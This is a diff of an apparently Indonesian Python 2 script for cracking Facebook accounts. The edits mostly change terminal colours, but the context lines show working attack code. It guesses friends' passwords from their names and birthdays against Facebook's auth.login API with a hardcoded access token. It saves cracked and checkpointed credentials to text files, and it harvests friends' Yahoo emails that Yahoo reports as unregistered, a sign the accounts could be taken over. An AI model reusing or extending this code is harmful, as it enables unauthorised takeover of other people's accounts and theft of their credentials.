@@ -345,7 +345,7 @@ def pilih_super():
     jalan('\x1b[1;97m=> \x1b[1;97mWaiting \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;97m=>[1;91m] \x1b[1;92mProsses \x1b[1;97m' + o,
+        print '\r\x1b[1;97m=> \x1b[1;92mProsses \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -361,38 +361,38 @@ def pilih_super():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;97OK \x1b[1;97m=> ' + user + ' | ' + pass1
+                print '\x1b[1;97mOK \x1b[1;97m=> \x1b[1;92m' + user + '  \x1b[1;97m| ' + pass1
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;97mCP \x1b[1;97m=> ' + user + ' | ' + pass1
+                    print '\x1b[1;97mCP \x1b[1;97m=> \x1b[1;91m' + user + '  \x1b[1;97m| ' + pass1
                 else:
                     pass2 = b['first_name'] + '12345'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92mOK \x1b[1;97m=> ' + user + ' | ' + pass2
+                        print '\x1b[1;92mOK \x1b[1;97m=> \x1b[1;92m' + user + '  \x1b[1;97m| ' + pass2
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;93mCP \x1b[1;97m=> ' + user + ' | ' + pass2
+                            print '\x1b[1;93mCP \x1b[1;97m=> \x1b[1;91m' + user + '  \x1b[1;97m| ' + pass2
                         else:
                             pass3 = b['last_name'] + '123'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92mOK \x1b[1;97m=> ' + user + ' | ' + pass3
+                                print '\x1b[1;92mOK \x1b[1;97m=> \x1b[1;92m' + user + '  \x1b[1;97m| ' + pass3
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;93mCP \x1b[1;97m=> ' + user + ' | ' + pass3
+                                    print '\x1b[1;93mCP \x1b[1;97m=> \x1b[1;91m' + user + '  \x1b[1;97m| ' + pass3
                                 else:
                                     lahir = b['birthday']
                                     pass4 = lahir.replace('/', '')
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92mOK \x1b[1;97m=> ' + user + ' | ' + pass4
+                                        print '\x1b[1;92mOK \x1b[1;97m=> \x1b[1;92m' + user + '  \x1b[1;97m| ' + pass4
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\x1b[1;93mCP \x1b[1;97m=> ' + user + ' | ' + pass4
+                                            print '\x1b[1;93mCP \x1b[1;97m=> \x1b[1;91m' + user + '  \x1b[1;97m| ' + pass4
         except:
             pass
 
@@ -435,7 +435,7 @@ def brute():
                     mpsh = json.loads(data.text)
                     if 'access_token' in mpsh:
                         dapat = open('Brute.txt', 'w')
-                        dapat.write(email + ' | ' + pw + '\n')
+                        dapat.write(email + '  \x1b[1;97m| ' + pw + '\n')
                         dapat.close()
                         print '\n\x1b[1;97m=> \x1b[1;9mFound.'
                         print 40 * '\x1b[1;97m\xe2\x95\x90'
@@ -445,7 +445,7 @@ def brute():
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
                             ceks = open('Brutecekpoint.txt', 'w')
-                            ceks.write(email + ' | ' + pw + '\n')
+                            ceks.write(email + '  \x1b[1;97m| ' + pw + '\n')
                             ceks.close()
                             print '\n\x1b[1;97m=> \x1b[1;9mFound.'
                             print 40 * '\x1b[1;97m\xe2\x95\x90'
@@ -570,9 +570,9 @@ def yahoofriends():
                 if '"messages.ERROR_INVALID_USERNAME">' in pek:
                     save.write(mail + '\n')
                     print 40 * '\x1b[1;97m\xe2\x95\x90'
-                    print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
-                    print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
-                    print '\x1b[1;97m=> \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
+                    print '\x1b[1;97m=> \x1b[1;92mNama  \x1b[1;91m: \x1b[1;92m' + nama
+                    print '\x1b[1;97m=> \x1b[1;92mID    \x1b[1;91m: \x1b[1;92m' + id
+                    print '\x1b[1;97m=> \x1b[1;92mEmail \x1b[1;91m: \x1b[1;92m' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                     print 40 * '\x1b[1;97m\xe2\x95\x90'
         except KeyError:
             pass
